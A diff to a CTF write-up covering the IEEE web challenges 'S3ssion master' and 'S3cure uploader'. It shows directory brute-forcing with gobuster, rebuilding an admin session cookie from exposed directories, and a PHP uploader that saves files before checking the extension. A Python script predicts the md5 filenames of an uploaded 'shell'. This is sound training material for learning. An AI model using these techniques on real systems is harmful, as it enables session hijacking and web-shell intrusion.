@@ -97,7 +97,7 @@ published: true
 
 ![](https://i.ibb.co/mD1VSgB/flagmd5.png)
 
-> **Flag: IEEE{password123}
+> **Flag: IEEE{password123}**
 
 # []()4.Brute Me
 
@@ -117,8 +117,155 @@ published: true
 
 * nice!, we are done from the Misc now, let's go to the Web now.
 
+# []() Web Challenges
 
+# []()1. S3ssion master 
 
+> **in this challenge we will play with the session cookie to get admin privilege to read the flag.**
+
+![](https://i.ibb.co/Q8ZZzjm/sessionmaster.png)
+
+* challenge [link](http://207.154.231.228:3000/)
+
+* let's go
+
+![](https://i.ibb.co/m0PDSwQ/suber.png)
+
+* nothing here, so let's fireup burpsuite and see what we can do.
+
+![](https://i.ibb.co/mHC5j6y/burp.png)
+
+> i played with the session but i can't figure what is it and how can we got the admin cookie until i see hint for this challenge.
+
+![](https://i.ibb.co/34bHvq3/hint.png)
+
+* so now we know that we need to bruteforce hidden directory.
+
+> **gobuster dir -u http://207.154.231.228:3000/ -w /usr/share/dirb/wordlists/common.txt -s 200,301**
+
+```ruby
+
+╭─xdev05@nic3One ~/Downloads/IEEE/writeup  
+╰─➤  gobuster dir -u http://207.154.231.228:3000/ -w /usr/share/dirb/wordlists/common.txt -s 200,301
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://207.154.231.228:3000/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
+[+] Status codes:   200,301,302
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/28 09:07:37 Starting gobuster
+===============================================================
+/sess (Status: 301)
+===============================================================
+2020/09/28 09:08:05 Finished
+===============================================================
+
+```
+
+> **after opening this dir i noticed that, every chat for dir and the file in the latest dir are cookie, let's see.**
+
+![](https://i.ibb.co/qnjZf9f/usercookie.png)
+
+> **so the other dir will ne the session for the admin let's see.**
+
+![](https://i.ibb.co/C85Trz0/admin.png)
+
+> **if we compined the dirs and the name of the file in it we will optain the admin session.**
+
+> **admin session: ry t2 w3 nd 2n xx on rd bq d7 qh 1o k71bzpev8zpa7vgnn24db4m4imvrhzo1zatw10iv**
+
+* so this is the session : **ryt2w3nd2nxxonrdbqd7qh1ok71bzpev8zpa7vgnn24db4m4imvrhzo1zatw10iv**
+
+* go to burp now and put it.
+
+![](https://i.ibb.co/tsPFbgS/adminflag.png)
+
+> **Flag: IEEE{wh0 473 my c00k13?} **
+
+# []()2.S3cure uploader 
+
+![](https://i.ibb.co/b34MSPJ/secure.png)
+
+* **uploader.php**
+
+```ruby
+
+<?php
+if(isset($_GET["upload"])) {
+$target_dir = "uploads/";
+$vars = explode(".", $_FILES["FileToUpload"]["name"]);
+$filename=$vars[0];
+$ext = $vars[1];
+//randomizing file name
+$time = date('Y-m-d H:i:s');
+$new_name = md5(rand(1,1000).$time.$filename."0x4148fo").".".strtolower(pathinfo(basename($_FILES["FileToUpload"]["name"]),PATHINFO_EXTENSION));
+$filename=explode(".", $_FILES["FileToUpload"]["name"])[0];
+$ext = $filename=explode(".", $_FILES["FileToUpload"]["name"])[1];
+$target_file = $target_dir . "$new_name";
+// Check if file already exists
+if (file_exists($target_file)) {
+  echo "File already exists.";
+  $uploadOk = 0;
+  die();
+}
+// Check file size
+if ($_FILES["FileToUpload"]["size"] > 500000) {
+  echo "File is too large.";
+  $uploadOk = 0;
+  die();
+}
+$uploadOk = 1;
+$check = getimagesize($_FILES["FileToUpload"]["tmp_name"]);
+if($check !== false) {
+    $uploadOk = 1;
+} else {
+    echo "File is not an image.";
+    $uploadOk = 0;
+    die();
+  }
+}
+move_uploaded_file($_FILES["FileToUpload"]["tmp_name"], $target_file);
+if(strtolower(pathinfo(basename($_FILES["FileToUpload"]["name"]),PATHINFO_EXTENSION))=="jpg"){
+echo "File uploaded successfully to $target_file";
+}
+else{
+	die("Invalid file type");
+}
+?>
+
+```
+
+* **hashs.py**
+
+```ruby
+
+#!/usr/bin/python
+import os
+
+import hashlib
+
+date = "2020-09-27 21:25:01"
+filename = "shell"
+key = "0x4148fo"
+print(key)
+with open("final.txt", 'w') as f:
+	for i in range(1,1001):
+		string = str(str(i)+date+filename+key).encode('utf-8')
+		hash = hashlib.md5(string).hexdigest()
+		print('{}'.format(hash), file=f)
+
+```
+
+# []() S3cure uploader Walkthrough
+
+[![Video](https://i.ibb.co/b34MSPJ/secure.png)](https://www.youtube.com/watch?v=ktoYt_myWBI&t=2s)
+
+* Cheers!
 
 
 
